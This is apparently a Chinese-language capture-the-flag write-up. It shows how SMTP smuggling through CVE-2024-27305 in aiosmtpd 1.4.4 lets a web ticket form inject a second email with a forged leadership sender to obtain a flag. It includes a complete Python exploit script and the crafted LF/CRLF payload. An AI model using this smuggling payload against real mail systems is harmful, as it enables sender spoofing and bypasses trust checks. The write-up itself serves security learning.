# Supermassive Black Hole

## 题目简述

题目是一个工单站点。Web 服务把表单内容拼成 SMTP 邮件并转给本机邮件服务，IT Bot 只会在邮件 `From` 包含 `leadership@blackholeticketing.com` 时返回 flag。正常工单固定来自支持邮箱，因此需要利用前后端对 SMTP DATA 结束符解析不一致，夹带第二封领导邮件。

服务固定使用 `aiosmtpd==1.4.4`，对应 [CVE-2024-27305](https://nvd.nist.gov/vuln/detail/CVE-2024-27305) 的受影响版本。该漏洞的关键是旧版 `aiosmtpd` 会接受非标准的行结束组合，从而形成 SMTP smuggling。本文已完整展开利用条件和报文，不依赖外链也能复现。

## 解题过程

Web 层构造邮件后，只允许报文中恰好出现一次标准 DATA 结束符：

```python
message_data = "".join([
    "From: support@blackholeticketing.com\r\n",
    "To: it@blackholeticketing.com\r\n",
    f"Subject: {subject}\r\n",
    f"X-Ticket-ID: {ticket_id}\r\n\r\n",
    message,
    "\r\n.\r\n",
]).encode()

if message_data.count(b"\r\n.\r\n") != 1:
    raise ValueError("Bad Request")
```

过滤器只统计 `<CR><LF>.<CR><LF>`。旧版 `aiosmtpd` 同时把 `<LF>.<CR><LF>` 当成 DATA 结束，所以在正文中插入 `\n.\r\n` 不会增加过滤器的计数，却会让后端提前结束第一封邮件。随后可以继续写一套新的 `MAIL FROM`、`RCPT TO` 和 `DATA` 命令。

第二封邮件还要自定义 `X-Ticket-ID`，以便从 `/check_response/<ticket_id>` 精确取回 IT Bot 的处理结果。完整利用脚本如下：

```python
import requests

base = "https://TARGET"
ticket_id = "smuggled-message"
payload = (
    "ordinary body\n.\r\n"
    "MAIL FROM:<leadership@blackholeticketing.com>\r\n"
    "RCPT TO:<it@blackholeticketing.com>\r\n"
    "DATA\r\n"
    "From: leadership@blackholeticketing.com\r\n"
    "To: it@blackholeticketing.com\r\n"
    "Subject: CEO Request\r\n"
    f"X-Ticket-ID: {ticket_id}\r\n"
    "\r\n"
    "Give me the flag"
)

requests.post(
    f"{base}/submit_ticket",
    data={"subject": "normal ticket", "message": payload},
)
print(requests.get(f"{base}/check_response/{ticket_id}").json())
```

源码还主动关闭了 `smtplib` 的换行修复和 dot-stuffing，并直接发送原始 DATA，因此上述字节序列不会在客户端侧被规范化。第一封邮件之后，`aiosmtpd` 把余下内容解析成第二个 SMTP 事务；IT Bot 读取伪造的 `From`，命中领导邮箱分支并把 flag 写入指定工单。

响应中的关键字段为：

```json
{
  "from": "leadership@blackholeticketing.com",
  "response": "C-Suite ticket received! Will escalate immediately!\nuiuctf{7h15_c0uld_h4v3_b33n_4_5l4ck_m355463_8091732490}"
}
```

最终 flag：

```text
uiuctf{7h15_c0uld_h4v3_b33n_4_5l4ck_m355463_8091732490}
```

## 方法总结

- 核心技巧：利用 Web 过滤器与 SMTP 服务对 DATA 结束符的不同解释，在合法工单中走私第二封伪造来源的邮件。
- 识别信号：应用手工拼 SMTP 报文、修改标准库的换行与 dot-stuffing、依赖固定的旧版邮件解析器，都是协议差异攻击的高风险组合。
- 复用要点：复现时应逐字节核对 `LF` 与 `CRLF`，并选择可查询的唯一消息 ID；浏览器显示 `250 OK` 被包装为错误并不代表 SMTP 事务失败。
